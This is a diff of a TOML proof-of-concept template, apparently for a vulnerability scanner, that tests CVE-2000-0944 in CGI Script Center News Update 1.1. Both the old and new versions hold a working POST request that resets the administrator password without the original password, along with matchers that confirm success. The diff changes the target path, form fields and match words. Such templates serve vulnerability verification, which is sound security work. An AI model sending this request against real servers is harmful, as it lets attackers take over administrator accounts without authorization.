@@ -1,36 +1,43 @@
 [info]
-author = "AVE"
-description = "CGI Script Center News Update 1.1 管理员密码修改绕过漏洞验证。通过向密码修改 CGI 接口发送不含原始密码参数的 POST 请求，可无需认证直接重置管理员密码。"
+author = "ave"
+description = "验证 CGI Script Center News Update 1.1 管理员密码修改验证绕过漏洞，攻击者无需原密码即可修改管理员密码"
 id = "POC-AVE-2000-0690"
 name = "CVE-2000-0944 PoC"
 severity = "critical"
-tags = ["cve-2000-0944"]
+tags = ["ave-2000-0690"]
 vuln_id = [
     "CVE-2000-0944",
     "AVE-2000-0690",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cgi-bin/news_update.cgi"
+path = "/cgi-bin/news/update/admin/password.pl"
 protocol = "http"
 
 [poc.requests.body]
-content = "newpass=attacker123&confirm=attacker123&action=change"
-type = "raw"
+content = "new_password=newpass123&confirm_password=newpass123&submit=Change+Password"
+type = "form"
 
 [poc.requests.headers]
 Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "Password Changed",
-    "password has been changed",
+    "password changed",
     "successfully",
+    "updated",
+    "success",
 ]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
